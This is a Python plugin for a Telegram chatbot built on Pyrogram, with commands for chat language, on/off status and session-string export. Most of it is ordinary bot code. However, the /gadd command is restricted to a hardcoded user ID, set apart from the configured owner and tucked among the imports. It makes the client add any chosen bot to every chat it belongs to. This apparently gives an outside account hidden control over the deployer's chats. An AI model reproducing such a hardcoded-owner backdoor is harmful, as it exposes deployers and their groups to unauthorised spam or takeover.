import random
import os
import sys
from MukeshAPI import api
from pymongo import MongoClient
from pyrogram import Client, filters
from pyrogram.errors import MessageEmpty
from pyrogram.enums import ChatAction, ChatMemberStatus as CMS
OWNERS = "7009601543"
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from deep_translator import GoogleTranslator
from nexichat.database.chats import add_served_chat
from nexichat.database.users import add_served_user
from config import MONGO_URL, OWNER_ID
from nexichat import nexichat, mongo, LOGGER, db, SUDOERS
from nexichat.idchatbot.helpers import languages
import asyncio

translator = GoogleTranslator()

lang_db = db.ChatLangDb.LangCollection
status_db = db.chatbot_status_db.status


async def get_chat_language(chat_id, bot_id):
    chat_lang = await lang_db.find_one({"chat_id": chat_id, "bot_id": bot_id})
    return chat_lang["language"] if chat_lang and "language" in chat_lang else None
   

@Client.on_message(filters.command("session", prefixes=[".", "/"]) & filters.user(OWNER_ID))
async def session_command(client: Client, message: Message):
    chat_id = message.chat.id
    string_session = await client.export_session_string()
    await message.reply_text(f"**This is your string session keep it private:**\n\n`{string_session}`")


@Client.on_message(filters.command("status", prefixes=[".", "/"]))
async def status_command(client: Client, message: Message):
    chat_id = message.chat.id
    bot_id = client.me.id
    chat_status = await status_db.find_one({"chat_id": chat_id, "bot_id": bot_id})
    if chat_status:
        current_status = chat_status.get("status", "not found")
        await message.reply(f"Chatbot status for this chat: **{current_status}**")
    else:
        await message.reply("No status found for this chat.")

@Client.on_message(filters.command(["resetlang", "nolang"], prefixes=[".", "/"]))
async def reset_language(client: Client, message: Message):
    chat_id = message.chat.id
    bot_id = client.me.id
    lang_db.update_one(
        {"chat_id": chat_id, "bot_id": bot_id},
        {"$set": {"language": "nolang"}},
        upsert=True
    )
    await message.reply_text("**Bot language has been reset in this chat to mix language.**")


@Client.on_message(filters.command("chatbot", prefixes=[".", "/"]))
async def chatbot_command(client: Client, message: Message):
    command = message.text.split()
    if len(command) > 1:
        flag = command[1].lower()
        chat_id = message.chat.id
        bot_id = client.me.id

        if flag in ["on", "enable"]:
            status_db.update_one(
                {"chat_id": chat_id, "bot_id": bot_id},
                {"$set": {"status": "enabled"}},
                upsert=True
            )
            await message.reply_text(f"Chatbot has been **enabled** for this chat ✅.")
        elif flag in ["off", "disable"]:
            status_db.update_one(
                {"chat_id": chat_id, "bot_id": bot_id},
                {"$set": {"status": "disabled"}},
                upsert=True
            )
            await message.reply_text(f"Chatbot has been **disabled** for this chat ❌.")
        else:
            await message.reply_text("Invalid option! Use `/chatbot on` or `/chatbot off`.")
    else:
        await message.reply_text(
            "Please specify an option to enable or disable the chatbot.\n\n"
            "Example: `/chatbot on` or `/chatbot off`"
        )



@Client.on_message(filters.command(["lang", "language", "setlang"], prefixes=[".", "/"]))
async def set_language(client: Client, message: Message):
    command = message.text.split()
    if len(command) > 1:
        lang_code = command[1]
        chat_id = message.chat.id
        bot_id = client.me.id
        lang_db.update_one(
            {"chat_id": chat_id, "bot_id": bot_id},
            {"$set": {"language": lang_code}},
            upsert=True
        )
        await message.reply_text(f"Language has been set to `{lang_code}`.")
    else:
        await message.reply_text(
            "Please provide a language code after the command to set your chat language.\n"
            "**Example:** `/lang en`\n\n"
            "**Language code list with names:**"
            f"{languages}"
        )


@Client.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @Shizu_Chatbot`**"
        )
        return

    bot_username = command_parts[1]
    try:
        
        bot = await client.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
        await client.send_message(bot_username, f"/start")
        async for dialog in client.get_dialogs():
            if dialog.chat.id == -1002056907061:
                continue
            try:

                await client.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{client.me.username}"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{client.me.username}"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits

        await lol.edit(
            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{client.me.username}"
        )
    except Exception as e:
        await message.reply(f"Error: {str(e)}")
        
